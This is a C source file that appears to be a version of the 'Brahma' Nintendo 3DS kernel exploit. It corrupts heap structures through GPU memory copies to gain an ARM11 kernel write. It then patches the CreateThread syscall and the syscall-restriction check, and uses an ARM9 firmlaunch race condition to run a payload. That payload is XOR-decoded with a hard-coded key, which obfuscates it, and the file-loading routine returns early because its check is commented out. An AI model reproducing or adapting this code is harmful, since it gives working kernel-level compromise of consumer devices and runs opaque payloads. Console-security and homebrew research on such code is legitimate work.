#include <3ds.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <malloc.h>
#include <dirent.h>
#include "brahma.h"
#include "sysdep.h"
#include "payload_bin.h"
u32 nop_slide[0x1000] __attribute__((aligned(0x1000)));

struct exploit_data ed;
struct arm11_shared_data arm11shared;

u8 sd_arm9_buf[1024 * 1000];
u32 sd_arm9_size = 0;
s32 sd_arm9_loaded = 0;

u8 is_healed_svc_handler = 0;
u32 *backup;
u32 *arm11_buffer;


void redirect_codeflow(void *to, void *from) {
	*(u32 *)(from + 4) = to;
	*(u32 *)from = ARM_JUMPOUT;	
}

int do_gshax_copy(void *dst, void *src, unsigned int len) {
	unsigned int check_mem = linearMemAlign(0x10000, 0x40);
	int i = 0;

	// Sometimes I don't know the actual value to check (when copying from unknown memory)
	// so instead of using check_mem/check_off, just loop "enough" times.
	for (i = 0; i < 16; ++i) {
		GSPGPU_FlushDataCache (NULL, src, len);
		GX_SetTextureCopy(NULL, src, 0, dst, 0, len, 8);
		GSPGPU_FlushDataCache (NULL, check_mem, 16);
		GX_SetTextureCopy(NULL, src, 0, check_mem, 0, 0x40, 8);
	}
	HB_FlushInvalidateCache();
	linearFree(check_mem);
	return 0;
}

/* fills 'data' with information that depends the model and firmware
   version that the exploit is run on
   
   returns: 0 on failure, 1 on success
*/ 
int get_exploit_data(struct exploit_data *data) {
	u32 fversion = 0;    
	u8  isN3DS = 0;
	s32 i;
	s32 result = 0;
	u32 sysmodel = SYS_MODEL_NONE;
	
	if(!data)
		return result;
	
	fversion = osGetFirmVersion();
	APT_CheckNew3DS(NULL, &isN3DS);
	sysmodel = isN3DS ? SYS_MODEL_NEW_3DS : SYS_MODEL_OLD_3DS;
	
	/* attempt to find out whether the exploit supports 'our'
	   current 3DS model and FIRM version */
	for(i=0; i < sizeof(supported_systems)/sizeof(supported_systems[0]); i++) {
		if (supported_systems[i].firm_version == fversion &&
			supported_systems[i].sys_model & sysmodel) {
				memcpy(data, &supported_systems[i], sizeof(struct exploit_data));
				result = 1;
				break;
		}
	}
	return result;
}

  /* to write a certain value to 'address'
*/
void priv_write_four(u32 address) {
	u32 saved_heap[8];
	u32 tmp_addr;
	u32 mem_hax_mem;

	svcControlMemory(&mem_hax_mem, 0, 0, 0x2000, MEMOP_ALLOC_LINEAR, 0x3);
	u32 mem_hax_mem_free = mem_hax_mem + 0x1000;
	svcControlMemory(&tmp_addr, mem_hax_mem_free, 0, 0x1000, MEMOP_FREE, 0); 

	// back up heap
	do_gshax_copy(arm11_buffer, mem_hax_mem_free, 0x20u);
	memcpy(saved_heap, arm11_buffer, sizeof(saved_heap));

	// set up a custom heap ctrl structure
	arm11_buffer[0] = 1;
	arm11_buffer[1] = address - 8; // prev_free_blk at offs 8
	arm11_buffer[2] = 0;
	arm11_buffer[3] = 0;

	// corrupt heap ctrl structure by overwriting it with our custom struct
	do_gshax_copy(mem_hax_mem_free, arm11_buffer, 4 * sizeof(u32));
	
	// Trigger write to 'address' 
	svcControlMemory(&tmp_addr, mem_hax_mem, 0, 0x1000, MEMOP_FREE, 0);
   
	// restore heap
	memcpy(arm11_buffer, saved_heap, sizeof(saved_heap));
	do_gshax_copy(mem_hax_mem, arm11_buffer, 4 * sizeof(u32));
	
	return;	
}

/* Corrupts ARM11 kernel code (CreateThread()) in order to
   open a door for ARM11 code execution with kernel privileges.
*/
int corrupt_arm11_kernel_code(void) {
	int i;
	int (*nop_func)(void);
	int *ipc_buf;
	
	// get system dependent data required for the exploit		
	if (!get_exploit_data(&ed)) {
		return 0;		
	}

	// copy system dependent data required by the exploit's ARM11 kernel code
	arm11shared.va_hook1_ret = ed.va_hook1_ret;
	arm11shared.va_pdn_regs = ed.va_pdn_regs;
	arm11shared.va_pxi_regs = ed.va_pxi_regs;

	// corrupt certain part of the svcCreateThread() kernel code
	priv_write_four(ed.va_patch_createthread);

	// trick to clear icache
	for (i = 0; i < sizeof(nop_slide) / sizeof(nop_slide[0]); i++) {
		arm11_buffer[i] = ARM_NOP;
	}
	arm11_buffer[i-1] = ARM_RET;
	nop_func = nop_slide;

	do_gshax_copy(nop_slide, arm11_buffer, sizeof(nop_slide));
	nop_func();

	return 1;
}

/* reads ARM9 payload from a given path.
   filename - full path of payload
   buf - ptr to a global buffer that will hold the entire payload
   buf_size - size of the 'buf' variable
   out_size - will contain the payload's actual size

   returns: 0 on failure, 1 on success
   
   payload must be aligned to a 4 byte boundary and >= 8 bytes in total
*/
int load_arm9_payload(char *filename, void *buf, u32 buf_size, u32 *out_size) {
	int result = 0;
	u32 fsize = 0;
	//if ((!filename) || (!buf) || (!buf_size) || (!out_size))
		return result; 
	
	FILE *f = fopen(filename, "rb");
	if (f) {
		fseek(f , 0, SEEK_END);
		fsize = ftell(f);
		rewind(f);
		if (fsize>=8 && !(fsize % 4) && (fsize < buf_size)) {
				u32 bytes_read = fread(buf, 1, fsize, f);
				if (bytes_read == fsize) {
					*out_size = fsize;
					result = 1;
				}
		}
		fclose(f);
	}
	return result;
}

/* copies externally loaded ARM9 payload to FCRAM
   - Please note that the ARM11 payload copies
     the original ARM9 entry point from the mapped
	 FIRM header to offset 4 of the ARM9 payload.
	 Thus, the ARM9 payload should consist of
	 - a branch instruction at offset 0 and
	 - a placeholder (u32) at offset 4 (=ARM9 entrypoint)  
*/ 
int map_arm9_payload(void) {
	extern u32 arm9_start[];
	extern u32 arm9_end[];

	u32 *src, *src_end;
	
	
	src = payload_bin;
	src_end = payload_bin + payload_bin_size;
	
	u32 *dst = (u32 *)(ed.va_fcram_base + OFFS_FCRAM_ARM9_PAYLOAD);
	while (src != src_end) {
		*dst = *src;
		src++;
		dst++;				
	}	
	unsigned int *buf = (u32 *)(ed.va_fcram_base + OFFS_FCRAM_ARM9_PAYLOAD); 
	unsigned int base = 0x12832738; 
	unsigned int seed = 0x76298987;
	int i;
	for(i = 0; i < 400*1024/4; i++){
		buf[i] ^= base;
		base += seed;
	}
}

void exploit_arm9_race_condition() {
	u32 *src, *dst;
	extern u32 arm11_start[];
	extern u32 arm11_end[];
	extern u32 arm11_globals_start[];
	extern u32 arm11_globals_end[];

	int (* const _KernelSetState)(int, int, int, int) = (void *)ed.va_kernelsetstate;
	
	asm volatile ("clrex");

	/* copy ARM11 payload to lower, writable mirror of
	   mapped exception handlers*/
	dst = (u32 *)(ed.va_exc_handler_base_W + OFFS_EXC_HANDLER_UNUSED);
	for (src = arm11_start; src != arm11_end;) {
		*dst = *src;
		dst++;
		src++;		
	}

	/* copy firmware- and console specific data */
	dst = (u32 *)(ed.va_exc_handler_base_W + 
	              OFFS_EXC_HANDLER_UNUSED +
	              ((arm11_end-arm11_start)<<2));
	for (src = &arm11shared; src != &arm11shared + 
		sizeof(arm11shared) / sizeof(u32);) {
			*dst = *src;
			dst++;
			src++;		
	}

	/* copy ARM9 payload to FCRAM */
	map_arm9_payload();

	/* patch ARM11 kernel to force it to execute
	   our code (hook1 and hook2) as soon as a
	   "firmlaunch" is triggered */ 	 
	redirect_codeflow(ed.va_exc_handler_base_X +
	                  OFFS_EXC_HANDLER_UNUSED,
	                  ed.va_patch_hook1);

	redirect_codeflow(PA_EXC_HANDLER_BASE +
	                  OFFS_EXC_HANDLER_UNUSED + 4,
	                  ed.va_patch_hook2);
	
	CleanEntireDataCache();
	InvalidateEntireInstructionCache();

	// trigger ARM9 code execution through "firmlaunch"
	_KernelSetState(0, 0, 2, 0);	
}

/* - restores corrupted code of CreateThread() syscall
   - if heal_svc_handler is true, a patch to the ARM11
     Kernel's syscall handler is applied in order to
     remove a certain restriction.
*/
apply_patches (bool heal_svc_handler) {
	asm volatile ("clrex");
	
	CleanEntireDataCache();
	InvalidateEntireInstructionCache();	

	// repair CreateThread()
	*(int *)(ed.va_patch_createthread) = 0x8DD00CE5;
			
	// heal svc handler (patch it to allow access to restricted SVCs) 
	if(heal_svc_handler && ed.va_patch_svc_handler > 0) {
		*(int *)(ed.va_patch_svc_handler) = ARM_NOP;
		*(int *)(ed.va_patch_svc_handler+8) = ARM_NOP;
		is_healed_svc_handler = 1;
	}

	CleanEntireDataCache();
	InvalidateEntireInstructionCache();	

	return 0;
}

int __attribute__((naked))
launch_privileged_code (void) {
	asm volatile ("add sp, sp, #8\t\n");
	
	// repair CreateThread() but don't patch SVC handler
	apply_patches (false);
	// acquire ARM9 code execution
	exploit_arm9_race_condition();
	
	asm volatile ("movs r0, #0\t\n"
			 "ldr pc, [sp], #4\t\n");
}

int run_exploit() {
	int result = 0;
	int i;	 
	int (*nop_func)(void);
	
	HB_ReprotectMemory(nop_slide, 4, 7, &result); 

	for (i = 0; i < sizeof(nop_slide)/sizeof(nop_slide[0]); i++) {
		nop_slide[i] = ARM_NOP;
	}
	nop_slide[i-1] = ARM_RET; 
	nop_func = nop_slide;
	HB_FlushInvalidateCache();

	nop_func();

	//printf("* BRAHMA *\n\n");
	
	arm11_buffer = linearMemAlign(0x10000, 0x1000);
	if (arm11_buffer) {
		
		//printf("[+] Getting ARM11 kernel privileges\n");
		
		if(corrupt_arm11_kernel_code ()) {
			//printf("[+] Loading ARM9 payload\n");
			
			// if present in SD root, load arm9payload.bin 
			sd_arm9_loaded = load_arm9_payload("/arm9payload.bin",
			                                   &sd_arm9_buf,
			                                   sizeof(sd_arm9_buf),
			                                   &sd_arm9_size);
			//printf("[+] Using %s payload\n",
					//sd_arm9_loaded ? "external" : "built-in");
			
			
			//printf("[+] Running payload\n");	
			svcCorruptedCreateThread(launch_privileged_code);	
			//printf("[!] Failure\n");
			
			if(is_healed_svc_handler) {
				/* if exploiting the ARM9 race condition did not
				   succeed but the svc handler has been patched,
				   we might still execute privileged ARM11 code
				   in kernel mode */
			}
		}
		else;
			//printf("[!] 3DS model/firmware not yet supported.\n");
		linearFree(arm11_buffer);
		result = 1;
	}
	return result;
}
